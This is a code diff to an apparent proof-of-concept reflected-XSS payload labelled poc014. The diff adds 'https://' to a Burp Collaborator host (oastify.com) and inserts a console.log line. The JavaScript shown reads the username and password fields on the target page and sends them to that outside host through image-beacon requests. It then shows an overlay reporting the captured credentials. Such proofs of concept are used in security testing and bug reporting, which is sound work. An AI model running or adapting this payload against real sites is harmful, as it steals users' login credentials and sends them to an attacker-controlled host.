@@ -4,7 +4,7 @@
 (function () {
   if (window.__poc014) { return; } window.__poc014 = 1;   // reflected twice; run once
   var d = document, O = d.domain;
-  var C = 'rlgjgtsmynieoqzrvkrvppgdb4hy5rtg.oastify.com';   // <-- the collaborator YOU watch
+  var C = 'https://rlgjgtsmynieoqzrvkrvppgdb4hy5rtg.oastify.com';   // <-- the collaborator YOU watch
   var KEEP = [];
   function beacon(path) {
     try { var im = new Image(); KEEP.push(im); im.src = C + path; } catch (e) {}
@@ -35,6 +35,7 @@
   var cap = function () {
     var u = d.getElementById('u').value || '(blank)', p = d.getElementById('p').value || '(blank)';
     beacon('creds?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p));
+     console.log(C)
     ov.innerHTML = '<div style="background:#0b1020;color:#d6e2ff;padding:24px;border-radius:10px;font:14px Consolas,monospace;max-width:640px">' +
       'Captured &amp; sent to your Collaborator:'+C+'<br><br>username: ' + u.replace(/[<>&]/g, '') +
       '<br>password: ' + p.replace(/[<>&]/g, '') + '<br><br>Executed on the genuine ' + O + ' origin via reflected XSS.</div>';
